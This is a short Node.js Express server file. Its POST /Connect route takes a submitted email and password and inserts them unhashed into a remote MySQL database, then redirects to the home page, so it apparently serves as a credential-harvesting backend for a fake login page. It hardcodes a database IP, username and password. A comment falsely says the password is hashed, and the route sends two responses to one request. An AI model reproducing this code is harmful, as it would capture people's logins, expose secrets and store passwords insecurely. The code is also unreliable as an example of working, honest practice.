/*

GEREKLİ PAKETLER YÜKLENİYOR...

*/

var http = require('http');
const express = require('express');
const bodyParser = require('body-parser');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const fs = require('fs');

var app = express();

app.set('port', process.env.PORT || 3000); 
app.set('views', __dirname + '/app/server/views'); 
app.set('view engine', 'ejs'); 
app.use(express.static(__dirname + '/app/public')); 
app.use(bodyParser.urlencoded({ extended: true }));
require('./app/routes')(app); 

app.use(bodyParser.urlencoded({ extended: false }));

// parse application/json
 // Add this line to use JSON middleware


const mysql = require('mysql2/promise');

// Configure the database connection details
const dbConfig = {
  host: '162.215.230.15',
  user: 'superprof',
  password: '5moc4S$42',
  database: 'DATA',
};


app.post('/Connect', async (req, res) => {
  try {
    const { email, password } = req.body;
    // Connect to the database
    const connection = await mysql.createConnection(dbConfig);

    // Insert the email and hashed password into the users table
    const [result] = await connection.execute(
      'INSERT INTO users (email, password) VALUES (?, ?)',
      [email, password]
    );

    // Close the database connection
    await connection.end();
    res.redirect('/');
    res.status(200).json({ message: 'Data saved successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'An error occurred while saving data' });
  }
});

http.createServer(app).listen(app.get('port'), function(){
	console.log('PORT: ' + app.get('port'));
});

